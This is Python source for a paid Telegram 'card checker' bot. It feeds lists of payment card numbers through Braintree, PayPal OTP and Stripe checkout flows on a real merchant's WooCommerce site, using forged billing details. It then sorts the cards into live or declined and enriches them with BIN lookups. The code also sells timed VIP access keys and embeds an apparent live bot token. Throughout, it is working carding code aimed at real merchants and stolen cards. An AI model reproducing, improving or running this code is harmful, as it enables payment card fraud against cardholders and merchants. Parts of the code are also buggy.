er_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_session_start_time=2024-11-09+15%3A21%3A23&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Tome&billing_last_name=Hunty&billing_company=&billing_country=US&billing_address_1=56+High+St&billing_address_2=&billing_city=Mold&billing_state=NY&billing_postcode=10090&billing_phone=1+253-290-6967&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flexible_shipping_single%3A13&payment_method=woocommerce_payments&wc_poynt_credit_card_nonce=&mailpoet_woocommerce_checkout_optin=1&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce={anonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wcpay-payment-method={id}&wcpay-fingerprint=016e96f79df6027a6c69222c48c94a1a&wcpay-fraud-prevention-token='
	
	response = r.post('https://puressentialsllc.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	
	msg=response.text
	if 'success' in msg or 'Thank you for your order.' in msg or 'successed' in msg or 'Thank you' in msg or 'Payment Successful' in msg:
		return 'Charged !✅'
	if "The card's security code is incorrect." in msg:
		return "The card's security code is incorrect."
	else:
		try:
			ms = response.json()['messages']
			msg1 = capture(ms, '<li>','</li>').strip()
			return msg1
		except:
			return 'eror'

# === End of gates.py ===

# === Start of bot.py ===
from reg import reg
from gates import *
from datetime import datetime, timedelta
from faker import Faker
import threading
import telebot
import requests
import json
import random
import time
from multiprocessing import Process
import string
from telebot import types
import re
stopuser = {}
token = '7906473814:AAHVE-eqV7GYoYLOfZlft9s_id1fFBEh_zA'  # DRAGON BOT#TOKEN
admin=6354338890

bot=telebot.TeleBot(token,parse_mode="HTML")

command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}

@bot.message_handler(commands=["start"])
def start(message):
    name = message.from_user.first_name
    photo_path = 'dragon_logo.jpg'
    with open(photo_path, 'rb') as photo:
        bot.send_photo(message.chat.id, photo, caption=f"🐉 Welcome {name} to DRAGON BOT 🐉")

    my_thread.start()
	
def code(id):
 def my_function():
  print(id)
  #if not id ==admin:
  # return
  try:
   h=24
   with open('data.json', 'r') as json_file:
    existing_data = json.load(json_file)
   characters = string.ascii_uppercase + string.digits
   pas ='VIP-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
   current_time = datetime.now()
   ig = current_time + timedelta(hours=h)
   plan='𝗩𝗜𝗣'
   parts = str(ig).split(':')
   ig = ':'.join(parts[:2])
   with open('data.json', 'r') as json_file:
    existing_data = json.load(json_file)
   new_data = {
    pas : {
   "plan": plan,
   "time": ig,
   }
   }
   existing_data.update(new_data)
   with open('data.json', 'w') as json_file:
    json.dump(existing_data, json_file, ensure_ascii=False, indent=4) 
   msg=f'''<b> ✅
𝗞𝗘𝗬 ➜ <code>/redeem {pas}</code>
 [𝗞𝗘𝗬]</b>'''
   bot.send_message(id, msg)
  except Exception as e:
   print('ERROR : ',e)
   bot.reply_to(message,e,parse_mode="HTML")
 my_thread = threading.Thread(target=my_function)
 my_thread.start()


 
###$#########بدايه الدفع
@bot.message_handler(commands=["buy"])
def process_payment(message):
    SERVICE_COST = 15
    prices = [
        LabeledPrice(label="خدمة البوت", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=message.chat.id,
        title="خدمة البوت",
        description=f"ادفع {SERVICE_COST} نجمة للاستفادة من كود 24 ساعه في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    id=message.chat.id
    bot.send_message(message.chat.id, "تم الدفع بنجاح! انتظر و سيتم ارسال لك الكود الذي اشتريته الان")
    code(id)	
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f" {BL} ",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗛𝗘𝗦𝗘 𝗔𝗥𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧'𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 
━━━━━━━━━━━━
━━━━━━━
[ϟ] Name: Brantree Auth 1
[ϟ] Format: /chk card|month|year|cvv
[ϟ] Condition: ON! ✅
[ϟ] Type: Only-Vip-User
━━━━━━━━━━━━━━━━━━━
━━━━━━━
[ϟ] Name: OTP PAYLAL
[ϟ] Format: /vbv card|month|year|cvv
[ϟ] Condition: ON! ✅
[ϟ] Type: Only-Vip-User
━━━━━━━━━━━━━━━━━━━
[ϟ] Name: strip chareg 6$ 
[ϟ] Format: /ss card|month|year|cvv
[ϟ] Condition: ON✅
[ϟ] Type: Only-Vip-User

[ϟ] Name: strip auth
[ϟ] Format: /dd card|month|year|cvv
[ϟ] Condition: ON✅
[ϟ] Type: Only-Vip-User
@يوزرك
</b>
''',reply_markup=keyboard)

@bot.message_handler(content_types=["document"])
def main(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "⚠️ فقط مدير البوت يمكنه استخدام الفحص. قم بالدفع أولاً.")
        return

		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text=" 𝗢𝗪𝗡𝗘𝗥  ", url="https://t.me/")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>
𝑯𝑬𝑳𝑳𝑶 {name} sorry you can not Use The Bot
</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text=" 𝗢𝗪𝗡𝗘𝗥  ", url="https://t.me/x")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>
𝑯𝑬𝑳𝑳𝑶 {name} sorry you can not Use The Bot</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text=" 𝗢𝗪𝗡𝗘𝗥  ", url="https://t.me/")
#			b2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/")
			keyboard.row(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		vvb = types.InlineKeyboardButton(text=f"ϟ - Bruntree Auth ✨",callback_data='vbv')
		vvbv = types.InlineKeyboardButton(text=f"ϟ - OTP Paypal",callback_data='vbv1')		
		wwwa = types.InlineKeyboardButton(text=f" Stripe Charge $6 $💀",callback_data='zoza')		
		keyboard.row(vvb)
		keyboard.row(vvbv)		
		keyboard.row(wwwa)		
		bot.reply_to(message, text=f'click start for start chk',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		abdo = (f"com{id}.txt")
		with open(abdo, "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'vbv')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth '
		cooo = (f"com{id}.txt")
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		try:
			with open(cooo, 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f''' 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>''', reply_markup=mes)
					
					msg=f'''<b>Approved ✅
#Braintree_Auth 🔥[/chk]
[ϟ] 𝐂𝐚𝐫𝐝 ->  <code>{cc}</code>
[⌥]  Status -> {last}
[⌥]  Gate -> {gate}
[⌥] 
[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last or 'try agen' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(3)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()	
	
@bot.callback_query_handler(func=lambda call: call.data == 'vbv1')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='OTP PayPal V1 '
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		abdo = (f"com{id}.txt")
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		try:
			with open(abdo, 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(vbv(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝙋𝘼𝙎𝙎𝙋✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝙊𝙏𝙋 💚  ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱  ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>''', reply_markup=mes)
					
					msg=f'''<b>Passed ✅
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -><code> {last}</code>
card Info -> <code>{card_type} </code>- <code>{brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Bot by : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b> ϟ - OTP Card ✅
#OTP
<a href='tg://user?id=5268530944'>[⌥]</a>Card ->  <code>{cc}</code>
<a href='tg://user?id=5268530944'>[⌥]</a> Status -> {last}
<a href='tg://user?id=5268530944'>[⌥]</a> Gate -> {gate}

card Info -> <code>{card_type} </code>- <code>{brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 

<a href='tg://user?id=5268530944'>[⌥]</a> Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
<a href='tg://user?id=5268530944'>[⌥]</a> Programmer -> @I_PNP⚡</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️-
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -><code> {last}</code>
card Info -> <code>{card_type} </code>- <code>{brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Bot by : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>𝘿𝙍𝙂𝘼𝙢</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'Successful' in last:
						ch += 1
						#bot.send_message(call.from_user.id, msg)
					elif "funjfbjds" in last:
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif 'Required' in last:
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(1)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')#علي الاقل اذكى المصدر
	my_thread = threading.Thread(target=my_function)
	my_thread.start()				

@bot.callback_query_handler(func=lambda call: call.data == 'zoza')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='stripe charge'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		cooo = (f"com{id}.txt")
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "- Please Wait Processing Your File ..")
		try:
			with open(cooo, 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Telev(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f''' 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>''', reply_markup=mes)
					
					msg=f'''<b>Approved ✅
[ϟ] 𝐂𝐚𝐫𝐝 ->  <code>{cc}</code>
[⌥]  Status -> {last}
[⌥]  Gate -> {gate}
[⌥] 
[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
					if "Charged !✅" in last or "The card's security code is incorrect." in last or 'Payment success' in last or 'success' in last or 'Payment Completed.' in last or 'Approved' in last or 'CVV' in last or 'Success'in last or 'CHARGED' in last or 'Payment has been made' in last or 'CHARGED 1$' in last or 'successfully' in last or 'INVALID_BILLING_ADDRESS' in last or 'Your payment has already been processed' in last or 'Thank You For Donation.' in last or 'status": "succeeded' in last or 'NEED_CREDIT_CARD' in last or 'Insufficient Funds' in last or 'Payment Successful' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last or 'try agen' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(3)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @I_PNP')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()		
	

@bot.message_handler(func=lambda message: message.text.lower().startswith('.ss') or message.text.lower().startswith('/ss'))
def respond_to_vbv(message):
	gate='stripe charge'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_pNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Telev(cc))
	except Exception as e:
		last='Error'
		print(e)
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msgd=f'''<b>ϟ -  Not valid ❌
[ϟ] Card ->  <code>{cc}</code>
[ϟ] Status -> {last}
[ϟ] Gate -> {gate}

card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 

[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
	msg=f'''<b> Approved ✅
[ϟ] Card ->  <code>{cc}</code>
[ϟ] Status -> {last}
[ϟ] Gate -> {gate}

card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 

[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
	msgc=f'''<b>𝑪𝑪𝑵 ☑️
	
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -> <code>{last}</code>
card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Dev : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
